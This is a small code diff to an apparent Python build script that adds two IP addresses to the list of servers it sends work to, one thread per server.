@@ -63,7 +63,7 @@ def main():
         ninja()
         packinstall()
     if args.send:
-        ips = ["51.158.68.232", "51.15.226.67", "51.15.248.67", "212.47.254.170"]
+        ips = ["51.158.68.232", "51.15.226.67", "51.15.248.67", "212.47.254.170", "212.47.234.94", "212.47.236.102"]
         for ip in ips:
             t = threading.Thread(target=worker, args=(ip,))
             t.start()
